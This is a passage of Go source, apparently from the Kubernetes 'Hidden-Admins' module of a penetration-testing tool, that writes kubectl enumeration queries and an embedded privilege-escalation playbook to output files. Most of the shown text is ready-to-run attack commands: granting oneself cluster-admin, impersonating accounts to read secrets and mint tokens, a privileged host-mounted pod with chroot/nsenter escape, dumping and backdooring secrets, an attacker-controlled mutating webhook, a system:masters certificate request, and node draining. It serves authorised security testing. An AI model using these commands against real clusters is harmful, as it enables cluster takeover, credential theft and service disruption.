kubectl get rolebindings --all-namespaces -o json | jq -r '.items[] | select(.roleRef.name=="admin" or .roleRef.name=="cluster-admin") | "\(.metadata.namespace): \(.roleRef.name) -> \(.subjects[]?.kind):\(.subjects[]?.name)"'

# Namespace-scoped RBAC modification
kubectl get roles --all-namespaces -o json | jq -r '.items[] | select(.rules[]? | (.resources[]? | test("roles|rolebindings")) and (.verbs[]? | test("create|update|patch"))) | "\(.metadata.namespace): \(.metadata.name)"'

# Namespace impersonation
kubectl get roles --all-namespaces -o json | jq -r '.items[] | select(.rules[]? | (.verbs[]?=="impersonate")) | "\(.metadata.namespace): \(.metadata.name)"'

# Create Pods with elevated privileges
kubectl get roles --all-namespaces -o json | jq -r '.items[] | select(.rules[]? | (.resources[]?=="pods") and (.verbs[]? | test("create"))) | "\(.metadata.namespace): \(.metadata.name)"'

`)

	// Build exploitation techniques loot file
	var lootExploits []string
	lootExploits = append(lootExploits, `#####################################
##### Privilege Escalation Techniques
#####################################
#
# MANUAL EXECUTION REQUIRED
# Actionable exploitation techniques for discovered permissions
#
`)

	if globals.KubeContext != "" {
		lootExploits = append(lootExploits, fmt.Sprintf("kubectl config use-context %s\n", globals.KubeContext))
	}

	lootExploits = append(lootExploits, `
##############################################
## 1. RBAC Modification (Privilege Escalation)
##############################################
# If you can create/update Roles, ClusterRoles, RoleBindings, or ClusterRoleBindings:

# Grant yourself cluster-admin
kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --user=<your-user>
kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --serviceaccount=<namespace>:<serviceaccount>

# Create a custom high-privilege role
cat <<EOF | kubectl apply -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: pwn-role
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: pwn-binding
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: pwn-role
subjects:
- kind: User
  name: <your-user>
  apiGroup: rbac.authorization.k8s.io
EOF

##############################################
## 2. Impersonation (Identity Theft)
##############################################
# If you can impersonate users, groups, or service accounts:

# Test impersonation
kubectl auth can-i --list --as=system:serviceaccount:kube-system:default
kubectl auth can-i --list --as=admin

# Impersonate cluster-admin or high-privilege user
kubectl --as=system:admin get secrets --all-namespaces
kubectl --as=system:serviceaccount:kube-system:default get secrets -n kube-system

# Extract service account tokens by impersonating
kubectl --as=system:serviceaccount:kube-system:admin create token admin -n kube-system --duration=24h

##############################################
## 3. Pod Creation (Container Escape)
##############################################
# If you can create pods:

# Create privileged pod for node escape
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: pwn-pod
  namespace: default
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: pwn
    image: alpine:latest
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
    command: ["/bin/sh"]
    args: ["-c", "sleep 3600"]
  volumes:
  - name: host
    hostPath:
      path: /
      type: Directory
EOF

# Execute into the pod
kubectl exec -it pwn-pod -- /bin/sh
# Inside pod, escape to host:
# chroot /host
# Or use nsenter:
# nsenter --target 1 --mount --uts --ipc --net --pid -- bash

##############################################
## 4. Secret Access (Credential Theft)
##############################################
# If you can read or modify secrets:

# Extract all secrets
kubectl get secrets --all-namespaces -o json | jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name): \(.data)"'

# Decode specific secret
kubectl get secret <secret-name> -n <namespace> -o jsonpath='{.data}' | jq -r 'to_entries[] | "\(.key)=\(.value | @base64d)"'

# Extract service account tokens
kubectl get secrets --all-namespaces -o json | jq -r '.items[] | select(.type=="kubernetes.io/service-account-token") | "\(.metadata.namespace)/\(.metadata.name)"'

# Modify secret to inject backdoor credentials
kubectl patch secret <secret-name> -n <namespace> -p '{"data":{"password":"YmFja2Rvb3I="}}'

##############################################
## 5. Pod Execution (Runtime Access)
##############################################
# If you can use pods/exec, pods/attach, or pods/portforward:

# Find pods to execute into
kubectl get pods --all-namespaces -o wide

# Execute into pod and steal secrets
kubectl exec -it <pod-name> -n <namespace> -- /bin/sh
# Inside pod:
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Extract environment variables (may contain secrets)
kubectl exec <pod-name> -n <namespace> -- env

# Port forward to access internal services
kubectl port-forward <pod-name> -n <namespace> 8080:80

##############################################
## 6. Admission Webhook Control (CRITICAL)
##############################################
# If you can create/modify ValidatingWebhookConfiguration or MutatingWebhookConfiguration:

# Intercept ALL cluster API requests
# WARNING: This can break the cluster if misconfigured
cat <<EOF | kubectl apply -f -
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingWebhookConfiguration
metadata:
  name: pwn-webhook
webhooks:
- name: pwn.example.com
  clientConfig:
    url: https://<your-webhook-server>/mutate
  rules:
  - operations: ["CREATE", "UPDATE"]
    apiGroups: ["*"]
    apiVersions: ["*"]
    resources: ["*"]
  admissionReviewVersions: ["v1"]
  sideEffects: None
EOF

# This webhook can:
# - Inject malicious containers into all pods
# - Modify secrets before creation
# - Bypass security policies
# - Capture sensitive data from all API requests

##############################################
## 7. Certificate Approval (Auth Bypass)
##############################################
# If you can create or approve CertificateSigningRequests:

# Create CSR for cluster-admin user
cat <<EOF | kubectl apply -f -
apiVersion: certificates.k8s.io/v1
kind: CertificateSigningRequest
metadata:
  name: pwn-csr
spec:
  request: <base64-encoded-csr>
  signerName: kubernetes.io/kube-apiserver-client
  usages:
  - client auth
  groups:
  - system:masters
EOF

# Approve the CSR
kubectl certificate approve pwn-csr

# Extract the certificate
kubectl get csr pwn-csr -o jsonpath='{.status.certificate}' | base64 -d > pwn.crt

##############################################
## 8. Node Modification (Cluster Disruption)
##############################################
# If you can modify nodes:

# Taint node to evict all pods
kubectl taint nodes <node-name> pwn=true:NoSchedule

# Drain node (evict all pods)
kubectl drain <node-name> --ignore-daemonsets --delete-emptydir-data

# Modify node labels to bypass scheduling constraints
kubectl label nodes <node-name> pwn=true

##############################################
## 9. Attack Path Chaining
##############################################
# Combine multiple permissions for maximum impact:

# Chain 1: Pod Creation → Host Escape → Node Compromise
# 1. Create privileged pod
# 2. Mount host filesystem
# 3. Chroot to host
# 4. Modify kubelet config or steal node credentials

# Chain 2: Secret Read → ServiceAccount Token → RBAC Escalation
# 1. Read service account secrets
# 2. Extract high-privilege SA token
# 3. Use token to create cluster-admin binding
# 4. Full cluster access

# Chain 3: Impersonate → Create Role → Bind to Self
# 1. Impersonate user with RBAC modification rights
# 2. Create cluster-admin role binding for yourself
# 3. Switch back to your identity with full access

# Chain 4: ConfigMap Modify → Pod Environment → Credential Injection
# 1. Modify ConfigMap used by pods
# 2. Inject malicious environment variables
# 3. Wait for pod restart or scale up
# 4. Pods execute with backdoor credentials

`)
	// Output section
	table := internal.TableFile{
		Name:   "Hidden-Admins",
		Header: headers,
		Body:   tableRows,
	}

	lootAdmins := internal.LootFile{
		Name:     "Hidden-Admin-Attack-Paths",
		Contents: strings.Join(k8sinternal.UniqueStrings(lootLines), "\n-----\n"),
	}

	loot := internal.LootFile{
		Name:     "Dangerous-Permissions-Enum",
		Contents: strings.Join(lootEnum, "\n"),
	}

	lootExploitation := internal.LootFile{
		Name:     "Privilege-Escalation-Techniques",
		Contents: strings.Join(lootExploits, "\n"),
	}

	lootSAPods := internal.LootFile{
		Name:     "ServiceAccount-Pod-Mapping",
		Contents: strings.Join(lootSAPodsMap, "\n"),
	}

	lootAttackPathsFile := internal.LootFile{
		Name:     "Attack-Path-Chains",
		Contents: strings.Join(lootAttackPaths, "\n"),
	}

	lootCloudIAMFile := internal.LootFile{
		Name:     "Cloud-IAM-Crosswalk",
		Contents: strings.Join(lootCloudIAM, "\n"),
	}

	lootRiskDashboardFile := internal.LootFile{
		Name:     "Risk-Dashboard",
		Contents: strings.Join(lootRiskDashboard, "\n"),
	}

	err = internal.HandleOutput(
		"Kubernetes",
		format,
		outputDirectory,
		verbosity,
		wrap,
		"Hidden-Admins",
		globals.ClusterName,
		"results",
		HiddenAdminsOutput{
			Table: []internal.TableFile{table},
			Loot:  []internal.LootFile{lootRiskDashboardFile, lootAttackPathsFile, lootCloudIAMFile, lootAdmins, loot, lootExploitation, lootSAPods},
		},
	)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error handling output: %v", err), globals.K8S_HIDDEN_ADMINS_MODULE_NAME)
		return
	}

	if len(tableRows) > 0 {
		logger.InfoM(fmt.Sprintf("%d hidden admin findings found", len(tableRows)), globals.K8S_HIDDEN_ADMINS_MODULE_NAME)
	} else {
		logger.InfoM("No hidden admin findings found, skipping output file creation", globals.K8S_HIDDEN_ADMINS_MODULE_NAME)
	}

	logger.InfoM(fmt.Sprintf("For context and next steps: https://github.com/BishopFox/cloudfox/wiki/Kubernetes-Commands#%s", globals.K8S_HIDDEN_ADMINS_MODULE_NAME), globals.K8S_HIDDEN_ADMINS_MODULE_NAME)
}
